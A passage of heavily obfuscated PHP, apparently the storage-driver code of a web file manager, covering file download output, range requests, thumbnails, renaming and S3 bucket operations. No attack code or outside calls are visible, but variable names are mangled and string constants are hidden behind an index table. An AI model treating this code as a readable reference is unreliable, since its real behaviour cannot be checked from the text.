$Õİ¤š = false, $“¬äó¼” = '') { $¸•šæéÈ =& $_SERVER[ì™ı‰º¯]; $this->cacheMethod(null, null); if (!$¿ª›šĞ¦ || !$this->exist($¿ª›šĞ¦)) { show_json(LNG($¸•šæéÈ[105]), !1, $Õİ¤š); } $’Éî”¨ = $this->getType() == $¸•šæéÈ[106]; $÷¼ªˆòá = $GLOBALS[$¸•šæéÈ[6]][$¸•šæéÈ[89]][$¸•šæéÈ[107]][$¸•šæéÈ[108]]; $íˆ¼ ÀÁ = (double) $GLOBALS[$¸•šæéÈ[6]][$¸•šæéÈ[89]][$¸•šæéÈ[107]][$¸•šæéÈ[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $†şĞõ’ö = $this->infoFull($¿ª›šĞ¦); $Ş–ö²Ø‘ = $†şĞõ’ö[$¸•šæéÈ[76]]; $É”ÃÙ° = gmdate($¸•šæéÈ[110], $†şĞõ’ö[$¸•šæéÈ[85]]); $ñİ¶ú¯Ã = $Õİ¤š ? $Õİ¤š : $this->iconvApp($†şĞõ’ö[$¸•šæéÈ[32]]); $ñ½¸İ› = 0; $ûæÁ÷áá = $Ş–ö²Ø‘ - 1; $«ÍÚ»íœ = $this->ext($ñİ¶ú¯Ã); if (in_array($«ÍÚ»íœ, array($¸•šæéÈ[111], $¸•šæéÈ[112], $¸•šæéÈ[113], $¸•šæéÈ[114]))) { $«ÍÚ»íœ = $¸•šæéÈ[115]; } if (in_array($«ÍÚ»íœ, array($¸•šæéÈ[116]))) { $«ÍÚ»íœ = $¸•šæéÈ[117]; } if (!$“¬äó¼”) { $“¬äó¼” = md5($É”ÃÙ° . $this->hashSimple($¿ª›šĞ¦)); } $“¬äó¼” = $¸•šæéÈ[118] . $“¬äó¼” . $¸•šæéÈ[118]; $µèƒêÌ¡ = get_file_mime($«ÍÚ»íœ); $ÍÉü–³Ş = !0; $ÍÉü–³Ş = isset($_GET[$¸•šæéÈ[119]]) ? !1 : !0; if ($ıË¸ûİÛ === !1 && !mime_support($µèƒêÌ¡)) { $µèƒêÌ¡ = $¸•šæéÈ[120]; } header($¸•šæéÈ[121]); header($¸•šæéÈ[122] . $µèƒêÌ¡); $ÙÜ¨¼½µ = rawurlencode($ñİ¶ú¯Ã); $ÙÜ¨¼½µ = $¸•šæéÈ[118] . $ÙÜ¨¼½µ . $¸•šæéÈ[123] . $ÙÜ¨¼½µ; if ($ıË¸ûİÛ) { header($¸•šæéÈ[124]); header($¸•šæéÈ[125] . $ÙÜ¨¼½µ); } else { if ($ÍÉü–³Ş) { header($¸•šæéÈ[126] . $ÙÜ¨¼½µ); } } header($¸•šæéÈ[127] . gmdate($¸•šæéÈ[110], time() + 3600 * 24 * 30) . $¸•šæéÈ[128]); header($¸•šæéÈ[129]); header($¸•šæéÈ[130]); header($¸•šæéÈ[131]); if (isset($_SERVER[$¸•šæéÈ[132]]) && strtotime($_SERVER[$¸•šæéÈ[132]]) == $†şĞõ’ö[$¸•šæéÈ[85]]) { header($¸•šæéÈ[133], !0, 304); die; } if (isset($_SERVER[$¸•šæéÈ[134]]) && $_SERVER[$¸•šæéÈ[134]] == $“¬äó¼”) { header($¸•šæéÈ[135] . $“¬äó¼”, !0, 304); die; } header($¸•šæéÈ[135] . $“¬äó¼”); header($¸•šæéÈ[136] . $É”ÃÙ° . $¸•šæéÈ[128]); header($¸•šæéÈ[137] . $ñİ¶ú¯Ã); header($¸•šæéÈ[138]); header($¸•šæéÈ[139] . $Ş–ö²Ø‘); header($¸•šæéÈ[140]); if (!$ıË¸ûİÛ && $«ÍÚ»íœ == $¸•šæéÈ[141]) { if ($Ş–ö²Ø‘ > 1024 * 1024 * 5) { die; } $µÆü‰ÁÄ = $this->getContent($¿ª›šĞ¦); $µÆü‰ÁÄ = Html::clearSVG($µÆü‰ÁÄ); header($¸•šæéÈ[142] . strlen($µÆü‰ÁÄ)); echo $µÆü‰ÁÄ; die; } $äÇÚ·Ñ = strtolower($_SERVER[$¸•šæéÈ[143]]); if ($’Éî”¨ && $äÇÚ·Ñ && $÷¼ªˆòá) { if (strstr($äÇÚ·Ñ, $¸•šæéÈ[144])) { header($¸•šæéÈ[145] . $¿ª›šĞ¦); } else { if (strstr($äÇÚ·Ñ, $¸•šæéÈ[146])) { header($¸•šæéÈ[147] . $¿ª›šĞ¦); } else { if (strstr($äÇÚ·Ñ, $¸•šæéÈ[148])) { header($¸•šæéÈ[149] . $¿ª›šĞ¦); } } } if ($íˆ¼ ÀÁ) { header($¸•šæéÈ[150] . $íˆ¼ ÀÁ); } return; } if (isset($_SERVER[$¸•šæéÈ[151]])) { if (preg_match($¸•šæéÈ[152], $_SERVER[$¸•šæéÈ[151]], $Ú¿ßôÌ¯)) { $ñ½¸İ› = intval($Ú¿ßôÌ¯[1]); $ñ½¸İ› = $ñ½¸İ› <= 0 ? 0 : ($ñ½¸İ› >= $ûæÁ÷áá ? $ûæÁ÷áá : $ñ½¸İ›); if (!empty($Ú¿ßôÌ¯[2])) { $ì—†ƒ¿Š = intval($Ú¿ßôÌ¯[2]); $ûæÁ÷áá = $ì—†ƒ¿Š < $ñ½¸İ› ? $ñ½¸İ› : ($ì—†ƒ¿Š >= $ûæÁ÷áá ? $ûæÁ÷áá : $ì—†ƒ¿Š); } } header($¸•šæéÈ[153]); header("\103\157\156\x74\x65\x6e\x74\55\x52\x61\x6e\x67\145\72\40\142\x79\x74\145\163\40{$ñ½¸İ›}\55{$ûæÁ÷áá}\57" . $Ş–ö²Ø‘); } else { header($¸•šæéÈ[154]); } header($¸•šæéÈ[155]); $ÈÒ…„“ = !0; if ($_SERVER[$¸•šæéÈ[156]] == $¸•šæéÈ[157] && $Ş–ö²Ø‘ > 1204 * 1024 * 1024 * 2) { $ÈÒ…„“ = !1; } if ($ÈÒ…„“) { header($¸•šæéÈ[158] . ($ûæÁ÷áá - $ñ½¸İ› + 1)); } if ($_SERVER[$¸•šæéÈ[159]] == $¸•šæéÈ[160]) { return; } $£ƒ”µ‹Ï = 1024 * 100; $§¢¯œƒí = 0; if ($íˆ¼ ÀÁ) { $§¢¯œƒí = intval(1000 * 1000 * ($£ƒ”µ‹Ï / $íˆ¼ ÀÁ)); } while ($ñ½¸İ› <= $ûæÁ÷áá) { $ÉİµñşÃ = timeFloat(); check_abort(); $¾ªığè = $ûæÁ÷áá - $ñ½¸İ› + 1; if ($¾ªığè <= $£ƒ”µ‹Ï) { $£ƒ”µ‹Ï = $¾ªığè; } echo $this->fileSubstr($¿ª›šĞ¦, $ñ½¸İ›, $£ƒ”µ‹Ï); $ñ½¸İ› += $£ƒ”µ‹Ï; if ($£ƒ”µ‹Ï == $¾ªığè) { $ñ½¸İ› = $ûæÁ÷áá + 1; } if ($§¢¯œƒí) { $Ü©¦Ò©û = intval(1000 * 1000 * (timeFloat() - $ÉİµñşÃ)); $Ûç‘ÈÆì = $§¢¯œƒí - $Ü©¦Ò©û; if ($Ûç‘ÈÆì > 5) { usleep($Ûç‘ÈÆì); } } } } public function fileOutServer($éÕÁßƒÊ, $Ü¯“îµ = false, $ö ˜×†ş = false, $·­·—“‰ = '') { $this->fileOut($éÕÁßƒÊ, $Ü¯“îµ, $ö ˜×†ş, $·­·—“‰); } public function fileOutLink($²û£Ö¥à) { header($_SERVER[ì™ı‰º¯][161] . $²û£Ö¥à); die; } public function cacheMethod($¶É¾¬Ìê, $¾šÙĞ÷©, $°òÎçç¢ = null) { $–ó¦ûÅı =& $_SERVER[ì™ı‰º¯]; static $Êª˜àø™ = array(); $ñí…Í†œ = $¾šÙĞ÷© ? ltrim($this->getPathOuter($¾šÙĞ÷©), $–ó¦ûÅı[8]) : $–ó¦ûÅı[12]; $¤¹Âõ¬¶ = $–ó¦ûÅı[162] . $¶É¾¬Ìê . $–ó¦ûÅı[163] . rtrim($ñí…Í†œ, $–ó¦ûÅı[8]); if (is_null($¶É¾¬Ìê)) { $Êª˜àø™ = array(); return; } if (is_null($¾šÙĞ÷©)) { foreach ($Êª˜àø™ as $¤¹Âõ¬¶ => $‹¬Åìøü) { if (!strstr($¤¹Âõ¬¶, $–ó¦ûÅı[162] . $¶É¾¬Ìê . $–ó¦ûÅı[164])) { continue; } unset($Êª˜àø™[$¤¹Âõ¬¶]); } return; } if (!is_null($°òÎçç¢)) { $Êª˜àø™[$¤¹Âõ¬¶] = $°òÎçç¢; return; } $Ç‹¡‚«’ = isset($Êª˜àø™[$¤¹Âõ¬¶]) ? $Êª˜àø™[$¤¹Âõ¬¶] : null; if (!is_null($Ç‹¡‚«’)) { return $Ç‹¡‚«’; } $Ç‹¡‚«’ = $this->{$¶É¾¬Ìê}($¾šÙĞ÷©); $Êª˜àø™[$¤¹Âõ¬¶] = $Ç‹¡‚«’; return $Ç‹¡‚«’; } public function cacheMethodInfoSet($øãæÆ×Ú, $ö—§š, $Ö»Ü¯­ = false) { $õ¼º‰É£ =& $_SERVER[ì™ı‰º¯]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($õ¼º‰É£[165], $øãæÆ×Ú, $ö—§š); $this->cacheMethod($õ¼º‰É£[166], $øãæÆ×Ú, $ö—§š ? !1 : !0); if (is_array($Ö»Ü¯­)) { $this->cacheMethod($õ¼º‰É£[167], $øãæÆ×Ú, $Ö»Ü¯­); } } public function fileOutImage($ÍÊ‡®ä‘, $Ö³«™ = 250) { $“º¤„×³ =& $_SERVER[ì™ı‰º¯]; set_timeout(); if (substr($ÍÊ‡®ä‘, 0, 4) == $“º¤„×³[148]) { $this->fileOutLink($ÍÊ‡®ä‘); } $áóò†ÕĞ = $this->info($ÍÊ‡®ä‘); $Æ’ÚÖ¤ˆ = $áóò†ÕĞ[$“º¤„×³[32]]; $Ğß½à€ = !1; if (isset($GLOBALS[$“º¤„×³[168]]) && $GLOBALS[$“º¤„×³[168]][$“º¤„×³[84]] == $áóò†ÕĞ[$“º¤„×³[84]]) { $ÚÜ¡èôÜ = $GLOBALS[$“º¤„×³[168]][$“º¤„×³[169]]; if (!$áóò†ÕĞ[$“º¤„×³[170]]) { $áóò†ÕĞ[$“º¤„×³[170]] = $GLOBALS[$“º¤„×³[168]]; } if (isset($ÚÜ¡èôÜ[$“º¤„×³[171]])) { if ($ÚÜ¡èôÜ[$“º¤„×³[171]] <= $Ö³«™ && $ÚÜ¡èôÜ[$“º¤„×³[172]] <= $Ö³«™) { $Ğß½à€ = !0; } } $Æ’ÚÖ¤ˆ = $áóò†ÕĞ[$“º¤„×³[170]][$“º¤„×³[32]]; } if ($áóò†ÕĞ[$“º¤„×³[76]] <= 1024 * 50 || $Ğß½à€ || !function_exists($“º¤„×³[173]) || $áóò†ÕĞ[$“º¤„×³[174]] == $“º¤„×³[175]) { return $this->fileOut($ÍÊ‡®ä‘, !1, $Æ’ÚÖ¤ˆ); } if (isset($áóò†ÕĞ[$“º¤„×³[170]][$“º¤„×³[176]])) { $ªİÇÉãÌ = $áóò†ÕĞ[$“º¤„×³[170]][$“º¤„×³[176]]; } else { if (isset($áóò†ÕĞ[$“º¤„×³[170]][$“º¤„×³[177]])) { $ªİÇÉãÌ = $áóò†ÕĞ[$“º¤„×³[170]][$“º¤„×³[177]]; } } if (!$ªİÇÉãÌ) { $ªİÇÉãÌ = md5("{$áóò†ÕĞ[$“º¤„×³[32]]}\x5f{$áóò†ÕĞ[$“º¤„×³[84]]}\137{$áóò†ÕĞ[$“º¤„×³[76]]}\x5f{$Ö³«™}"); } $¬æËàİÃ = "{$ªİÇÉãÌ}\x5f{$Ö³«™}\x2e\160\x6e\x67"; if (!($à§ÂÛà‘ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $“º¤„×³[178]))) { $©á“±ƒ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $“º¤„×³[179]); } else { $©á“±ƒ = KodIO::make($à§ÂÛà‘); } if ($à§ÂÛà‘ = IO::fileNameExist($©á“±ƒ, $¬æËàİÃ)) { $ËœÌÏ¹  = KodIO::make($à§ÂÛà‘); return IO::fileOut($ËœÌÏ¹ , !1, $Æ’ÚÖ¤ˆ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $ËœÌÏ¹  = DATA_THUMB . $¬æËàİÃ; del_file($ËœÌÏ¹ ); if (!@file_exists($ËœÌÏ¹ )) { $€‡á®¡Ã = TEMP_FILES; if (!is_dir($€‡á®¡Ã)) { mk_dir($€‡á®¡Ã); } $š—üš“Æ = $€‡á®¡Ã . $ªİÇÉãÌ . $“º¤„×³[10] . $áóò†ÕĞ[$“º¤„×³[174]]; if (!@file_exists($š—üš“Æ)) { $š—üš“Æ = $this->download($ÍÊ‡®ä‘, $š—üš“Æ); } ImageThumb::createThumb($š—üš“Æ, $ËœÌÏ¹ , $Ö³«™, $Ö³«™ * 10); } if (!file_exists($ËœÌÏ¹ ) || filesize($ËœÌÏ¹ ) < 100) { return @file_exists($š—üš“Æ) ? IO::fileOut($š—üš“Æ) : $this->fileOut($ÍÊ‡®ä‘); } if (!($ü Áê = IO::move($ËœÌÏ¹ , $©á“±ƒ))) { return IO::fileOut($ËœÌÏ¹ ); } del_file($ËœÌÏ¹ ); IO::fileOut($ü Áê); } public function fileOutImageServer($Ç»«³›¸, $¨ñã‘Ëû = 250) { $this->fileOutImage($Ç»«³›¸, $¨ñã‘Ëû); } public function fileNameAuto($ƒÆÅ¸×î, $½Ç×æ·, $äääË·è = REPEAT_RENAME, $”ëµÂÕ = false) { $¦À…Ÿó =& $_SERVER[ì™ı‰º¯]; $­—§àÂõ = $ƒÆÅ¸×î === $¦À…Ÿó[12] ? $½Ç×æ· : rtrim($ƒÆÅ¸×î, $¦À…Ÿó[8]) . $¦À…Ÿó[8] . $½Ç×æ·; if ($äääË·è == REPEAT_REPLACE || !$this->exist($­—§àÂõ) || $”ëµÂÕ && $äääË·è != REPEAT_RENAME_FOLDER) { return $½Ç×æ·; } if ($äääË·è == REPEAT_SKIP) { return !1; } $ŒáîÎ¤‹ = $¦À…Ÿó[10] . get_path_ext($½Ç×æ·); $ŒáîÎ¤‹ = $ŒáîÎ¤‹ == $¦À…Ÿó[10] || $”ëµÂÕ ? $¦À…Ÿó[12] : $ŒáîÎ¤‹; $Áİîç× = 1; $é…²¥¶ = substr($½Ç×æ·, 0, strlen($½Ç×æ·) - strlen($ŒáîÎ¤‹)); $›¤áÇê = $é…²¥¶ . "\x28{$Áİîç×}\x29{$ŒáîÎ¤‹}"; while ($this->exist(rtrim($ƒÆÅ¸×î, $¦À…Ÿó[8]) . $¦À…Ÿó[8] . $›¤áÇê)) { $›¤áÇê = $é…²¥¶ . "\x28{$Áİîç×}\x29{$ŒáîÎ¤‹}"; $Áİîç×++; } return $›¤áÇê; } private function fileNameAutoList($â­Œçî¤, $Şå¨İÌ, $„ÉŞ˜ı = false) { $€ñ°Š¸ =& $_SERVER[ì™ı‰º¯]; $›‡€µºÔ = $this->listPath($â­Œçî¤, !0); $›‡€µºÔ = array_merge($›‡€µºÔ[$€ñ°Š¸[82]], $›‡€µºÔ[$€ñ°Š¸[83]]); $”¡ØÜîš = array_to_keyvalue($›‡€µºÔ, $€ñ°Š¸[12], $€ñ°Š¸[32]); $î§ÉÃç¶ = $€ñ°Š¸[10] . get_path_ext($Şå¨İÌ); $î§ÉÃç¶ = $î§ÉÃç¶ == $€ñ°Š¸[10] || $„ÉŞ˜ı ? $€ñ°Š¸[12] : $î§ÉÃç¶; $€ ü¾© = substr($Şå¨İÌ, 0, strlen($Şå¨İÌ) - strlen($î§ÉÃç¶)); $Øı¶¿ ÷ = $€ ü¾© . "\50\60\51{$î§ÉÃç¶}"; for ($Ô£§¯™Ó = 1; $Ô£§¯™Ó <= count($”¡ØÜîš) + 1; $Ô£§¯™Ó++) { $Øı¶¿ ÷ = $€ ü¾© . "\50{$Ô£§¯™Ó}\51{$î§ÉÃç¶}"; if (!in_array_not_case($Øı¶¿ ÷, $”¡ØÜîš)) { return $Øı¶¿ ÷; } } return $Øı¶¿ ÷; } public function listAllFiles($°Ğ©ı·¸, $›÷Î‡˜æ) { $ÓµÅÛó™ =& $_SERVER[ì™ı‰º¯]; if (empty($›÷Î‡˜æ)) { return array(); } $·‚ˆ¡‹ò = array_keys($›÷Î‡˜æ); $Éœ‹ÆÎ = array(); $°Ğ©ı·¸ = trim($°Ğ©ı·¸, $ÓµÅÛó™[8]); foreach ($›÷Î‡˜æ as $Û–©Âû¬ => $¶¬ÀÎéÙ) { $¢²ÚÍÌ = ltrim(substr(trim($Û–©Âû¬, $ÓµÅÛó™[8]), strlen($°Ğ©ı·¸)), $ÓµÅÛó™[8]); if (substr($Û–©Âû¬, -1) == $ÓµÅÛó™[8]) { $¢²ÚÍÌ = rtrim($¢²ÚÍÌ, $ÓµÅÛó™[8]) . $ÓµÅÛó™[8]; } $Éœ‹ÆÎ = array_merge($Éœ‹ÆÎ, $this->slicePath($¢²ÚÍÌ)); } $Âäúôå¼ = array(); foreach (array_unique($Éœ‹ÆÎ) as $´÷Û—åğ) { $õÔµî© = array($ÓµÅÛó™[84] => $this->getPathOuter($ÓµÅÛó™[8] . $°Ğ©ı·¸ . $ÓµÅÛó™[8] . $´÷Û—åğ), $ÓµÅÛó™[75] => 1, $ÓµÅÛó™[76] => 0); if (substr($´÷Û—åğ, -1) != $ÓµÅÛó™[8]) { $õÔµî©[$ÓµÅÛó™[75]] = 0; $ÂÉêºİ¯ = $this->getPath($°Ğ©ı·¸ . $ÓµÅÛó™[8] . $´÷Û—åğ); if (isset($›÷Î‡˜æ[$ÂÉêºİ¯])) { $·ØÄóúÅ = $›÷Î‡˜æ[$ÂÉêºİ¯]; if (isset($·ØÄóúÅ[$ÓµÅÛó™[76]])) { $õÔµî©[$ÓµÅÛó™[76]] = intval($·ØÄóúÅ[$ÓµÅÛó™[76]]); } if (isset($·ØÄóúÅ[$ÓµÅÛó™[180]])) { $õÔµî©[$ÓµÅÛó™[85]] = intval($·ØÄóúÅ[$ÓµÅÛó™[180]]); } } } $Âäúôå¼[] = $õÔµî©; } return $Âäúôå¼; } public function slicePath($øüìœ…) { $Ù÷ƒ—…• =& $_SERVER[ì™ı‰º¯]; $åç˜Å¸µ = explode($Ù÷ƒ—…•[8], trim($øüìœ…, $Ù÷ƒ—…•[8])); $¢Êª© = 0; do { ++$¢Êª©; $®¿–±´Æ[] = implode($Ù÷ƒ—…•[8], array_slice($åç˜Å¸µ, 0, $¢Êª©)) . $Ù÷ƒ—…•[8]; } while ($¢Êª© < count($åç˜Å¸µ)); $®¿–±´Æ[count($åç˜Å¸µ) - 1] = $øüìœ…; return $®¿–±´Æ; } public function getHost() { $â²ò˜ÉŸ =& $_SERVER[ì™ı‰º¯]; $´ë£×¬ = parse_url(trim($this->domain, $â²ò˜ÉŸ[8])); $£ˆ‡Îßœ = isset($´ë£×¬[$â²ò˜ÉŸ[181]]) ? $´ë£×¬[$â²ò˜ÉŸ[181]] : http_type(); $Ğ¦·–²” = isset($´ë£×¬[$â²ò˜ÉŸ[182]]) ? $´ë£×¬[$â²ò˜ÉŸ[182]] : $´ë£×¬[$â²ò˜ÉŸ[84]]; if (isset($´ë£×¬[$â²ò˜ÉŸ[183]])) { $Ğ¦·–²” .= $â²ò˜ÉŸ[4] . $´ë£×¬[$â²ò˜ÉŸ[183]]; } return $£ˆ‡Îßœ . $â²ò˜ÉŸ[184] . $Ğ¦·–²”; } public function pathEncode($šµ¥ØşÒ) { $êš·™ëë =& $_SERVER[ì™ı‰º¯]; return str_replace($êš·™ëë[185], $êš·™ëë[8], rawurlencode($šµ¥ØşÒ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($éÈùì) { set_timeout(); require_once SDK_DIR . $_SERVER[ì™ı‰º¯][186]; parent::__construct(); $this->_init($éÈùì); } public function _init($Á¶è½£) { $this->config = $Á¶è½£; foreach ($Á¶è½£ as $ß…Áİè” => $‹©Ÿ­È) { if (isset($this->{$ß…Áİè”})) { $this->{$ß…Áİè”} = $‹©Ÿ­È; } } $this->endpoint = $Á¶è½£[$_SERVER[ì™ı‰º¯][187]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ú¥ª£’ã = "\x76\64") { $this->signVer = $ú¥ª£’ã; $this->client->setSignatureVersion($ú¥ª£’ã); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ÅîÚ“Óß =& $_SERVER[ì™ı‰º¯]; $ß»çŒª¥ = $this->getBucketCors(); if (!$ß»çŒª¥ || !is_array($ß»çŒª¥)) { return !1; } if ($ß»çŒª¥[$ÅîÚ“Óß[188]] != $ÅîÚ“Óß[189] || $ß»çŒª¥[$ÅîÚ“Óß[190]] != $ÅîÚ“Óß[189]) { return !1; } $‹Û¼İ‰ = array_map($ÅîÚ“Óß[191], $ß»çŒª¥[$ÅîÚ“Óß[192]]); if (!is_array($‹Û¼İ‰)) { $‹Û¼İ‰ = array(); } $²Îèù· = array($ÅîÚ“Óß[193], $ÅîÚ“Óß[194], $ÅîÚ“Óß[195], $ÅîÚ“Óß[196], $ÅîÚ“Óß[197]); $ıë§•Í = array_diff($²Îèù·, $‹Û¼İ‰); return empty($ıë§•Í); } public function mkfile($ìäè²­, $®ÄÀÎ¾¥ = '', $İâ˜Ûµ› = REPEAT_RENAME) { $ö”È»¹Ñ = $this->setContent($ìäè²­, $®ÄÀÎ¾¥); if ($ö”È»¹Ñ !== !1) { return $this->getPathOuter($ìäè²­); } return !1; } public function mkdir($ĞÛ–€ö“, $Çı¤ù‰° = REPEAT_SKIP) { $œ¡ºà¥¸ =& $_SERVER[ì™ı‰º¯]; if (empty($ĞÛ–€ö“) && $ĞÛ–€ö“ !== $œ¡ºà¥¸[198]) { return !1; } if ($Çı¤ù‰° && $this->_isFolder($ĞÛ–€ö“)) { return $this->getPathOuter($ĞÛ–€ö“); } $ù·¼Œã– = $this->setContent($ĞÛ–€ö“, $œ¡ºà¥¸[12], !0); if ($ù·¼Œã– !== !1) { return $this->getPathOuter($ĞÛ–€ö“); } return !1; } public function copyFile($í¶Ô¸çÅ, $µ³–Î–‚, $Âˆï´«¤ = array()) { $†’¹Ú£« =& $_SERVER[ì™ı‰º¯]; $³ÊÆ¾¾á = $this->objectMeta($í¶Ô¸çÅ); if (!$³ÊÆ¾¾á) { return !1; } if ($³ÊÆ¾¾á[$†’¹Ú£«[76]] <= 1024 * 1024 * 200) { $…åˆ±¢³ = $this->client->copyObject($this->bucket, $í¶Ô¸çÅ, $this->bucket, $µ³–Î–‚, $†’¹Ú£«[199], $Âˆï´«¤); } else { $…åˆ±¢³ = $this->client->multiCopyObject($this->bucket, $í¶Ô¸çÅ, $this->bucket, $µ³–Î–‚, $Âˆï´«¤); } $…åˆ±¢³ = $…åˆ±¢³ ? $this->getPathOuter($µ³–Î–‚) : !1; return $…åˆ±¢³; } public function moveFile($áßã¬½, $·¾á½Å) { if ($this->copyFile($áßã¬½, $·¾á½Å)) { $this->delFile($áßã¬½); return $this->getPathOuter($·¾á½Å); } return !1; } public function delFile($‡Í’È£×) { return $this->client->deleteObject($this->bucket, $‡Í’È£×); } public function delFolder($‘³ò‚ª) { $â‰ĞïŠÈ =& $_SERVER[ì™ı‰º¯]; if (!$this->exist($‘³ò‚ª)) { return !0; } $this->listItemCache = !1; $¡Ãµ—¸ = $this->fileList($‘³ò‚ª); $this->listItemCache = !0; $ò²ÔÍÌ² = trim($‘³ò‚ª, $â‰ĞïŠÈ[8]) . $â‰ĞïŠÈ[8]; if (!empty($‘³ò‚ª) && $‘³ò‚ª !== $â‰ĞïŠÈ[198] && !in_array($ò²ÔÍÌ², $¡Ãµ—¸[$â‰ĞïŠÈ[82]])) { $¡Ãµ—¸[$â‰ĞïŠÈ[82]][] = $ò²ÔÍÌ²; } $ï‡ˆ÷Ğï = $this->delByBatch($¡Ãµ—¸[$â‰ĞïŠÈ[83]]); if (!$ï‡ˆ÷Ğï) { return !1; } $ï‡ˆ÷Ğï = $this->delByBatch($¡Ãµ—¸[$â‰ĞïŠÈ[82]]); if (!$ï‡ˆ÷Ğï) { return !1; } return $this->delFile($ò²ÔÍÌ²); } private function delByBatch($æÜ©ÍŸ¯) { foreach (array_chunk($æÜ©ÍŸ¯, 1000) as $ô¸Ë¦) { $İ¿‹å˜À = $this->client->deleteObjects($this->bucket, $ô¸Ë¦); if (!$İ¿‹å˜À) { return !1; } } return !0; } public function rename($¹õüõëı, $şÑ¥¨´Ö) { return $this->renameObject($¹õüõëı, $şÑ¥¨´Ö); } public function listPath($ëÎ£—Ò, $è÷¸õëÀ = false) { $ë§ß¥Îˆ =& $_SERVER[ì™ı‰º¯]; $Ìãäß—½ = $this->fileList($ëÎ£—Ò, $ë§ß¥Îˆ[8], !0); foreach ($Ìãäß—½[$ë§ß¥Îˆ[82]] as $Å¡è½¢ç => $ÇÑØ¾æ) { $Ìãäß—½[$ë§ß¥Îˆ[82]][$Å¡è½¢ç] = $this->folderInfo($ÇÑØ¾æ, $è÷¸õëÀ, $ÇÑØ¾æ); } foreach ($Ìãäß—½[$ë§ß¥Îˆ[83]] as $Å¡è½¢ç => $ÇÑØ¾æ) { $Ìãäß—½[$ë§ß¥Îˆ[83]][$Å¡è½¢ç] = $this->fileInfo($ÇÑØ¾æ[$ë§ß¥Îˆ[32]], $è÷¸õëÀ, $ÇÑØ¾æ); } return $Ìãäß—½; } protected function infoChildren($‡İºÀÄ», &$ò®óñ©á) { $ƒ€Â¦š  =& $_SERVER[ì™ı‰º¯]; $ë˜ßş¢ = $this->fileList($‡İºÀÄ», $ƒ€Â¦š [12], !0); $ò®óñ©á[$ƒ€Â¦š [78]] += count($ë˜ßş¢[$ƒ€Â¦š [82]]); $ò®óñ©á[$ƒ€Â¦š [77]] += count($ë˜ßş¢[$ƒ€Â¦š [83]]); foreach ($ë˜ßş¢[$ƒ€Â¦š [83]] as $ÌÉ’ş) { if (!$ÌÉ’ş || !$ÌÉ’ş[$ƒ€Â¦š [76]]) { continue; } $ò®óñ©á[$ƒ€Â¦š [76]] += $ÌÉ’ş[$ƒ€Â¦š [76]]; } } private function fileInfo($÷¡Û½¹½, $”€¯ºÙÒ = false, $ç§æ‡ÁŒ = array()) { $‡–Ó¢å =& $_SERVER[ì™ı‰º¯]; $ş¬û÷İ = array($‡–Ó¢å[32] => $this->pathThis($÷¡Û½¹½), $‡–Ó¢å[84] => $this->getPathOuter($÷¡Û½¹½), $‡–Ó¢å[33] => $‡–Ó¢å[200], $‡–Ó¢å[174] => $this->ext($÷¡Û½¹½), $‡–Ó¢å[76] => isset($ç§æ‡ÁŒ[$‡–Ó¢å[76]]) ? $ç§æ‡ÁŒ[$‡–Ó¢å[76]] : 0); if ($”€¯ºÙÒ) { return $ş¬û÷İ; } $ş¬û÷İ[$‡–Ó¢å[201]] = $ş¬û÷İ[$‡–Ó¢å[85]] = 0; $ş¬û÷İ[$‡–Ó¢å[202]] = $ş¬û÷İ[$‡–Ó¢å[203]] = !0; if (empty($ç§æ‡ÁŒ)) { $ç§æ‡ÁŒ = $this->objectMeta($÷¡Û½¹½); if (!$ç§æ‡ÁŒ) { return $ş¬û÷İ; } } if (isset($ç§æ‡ÁŒ[$‡–Ó¢å[180]])) { $ş¬û÷İ[$‡–Ó¢å[85]] = $ç§æ‡ÁŒ[$‡–Ó¢å[180]]; } if (isset($ç§æ‡ÁŒ[$‡–Ó¢å[76]])) { $ş¬û÷İ[$‡–Ó¢å[76]] = $ç§æ‡ÁŒ[$‡–Ó¢å[76]]; } return $ş¬û÷İ; } private function folderInfo($ÂÚ…‹ç, $äÑ²€˜Ã = false, $®áÆƒƒ = array()) { $¸÷üğ˜Ä =& $_SERVER[ì™ı‰º¯]; $¥‘ÇÀÉë = array($¸÷üğ˜Ä[32] => $this->pathThis($ÂÚ…‹ç), $¸÷üğ˜Ä[84] => $this->getPathOuter($¸÷üğ˜Ä[8] . $ÂÚ…‹ç), $¸÷üğ˜Ä[33] => $¸÷üğ˜Ä[75]); if ($äÑ²€˜Ã) { return $¥‘ÇÀÉë; } $¥‘ÇÀÉë[$¸÷üğ˜Ä[201]] = $¥‘ÇÀÉë[$¸÷üğ˜Ä[85]] = 0; $¥‘ÇÀÉë[$¸÷üğ˜Ä[202]] = $¥‘ÇÀÉë[$¸÷üğ˜Ä[203]] = !0; if ($ÂÚ…‹ç == $¸÷üğ˜Ä[12]) { return $¥‘ÇÀÉë; } if (empty($®áÆƒƒ)) { $®áÆƒƒ = $this->objectMeta(trim($ÂÚ…‹ç, $¸÷üğ˜Ä[8]) . $¸÷üğ˜Ä[8]); } if (isset($®áÆƒƒ[$¸÷üğ˜Ä[180]])) { $¥‘ÇÀÉë[$¸÷üğ˜Ä[201]] = $®áÆƒƒ[$¸÷üğ˜Ä[180]]; } return $¥‘ÇÀÉë; } private function fileList($ñÑÃâĞé, $ŠÁ‡Ú¾ó = '', $ô½¶½şÛ = 0) { $ÕßÇ½Î =& $_SERVER[ì™ı‰º¯]; $Œ¤¥×øî = rtrim($ñÑÃâĞé, $ÕßÇ½Î[8]) . $ÕßÇ½Î[8]; $€±¦’©Ä = $this->listObjs($Œ¤¥×øî, null, null, $ŠÁ‡Ú¾ó); if (!$€±¦’©Ä) { return array($ÕßÇ½Î[82] => array(), $ÕßÇ½Î[83] => array()); } $ø¬¿ıÉï = $Ÿåè¡Â½ = array(); foreach 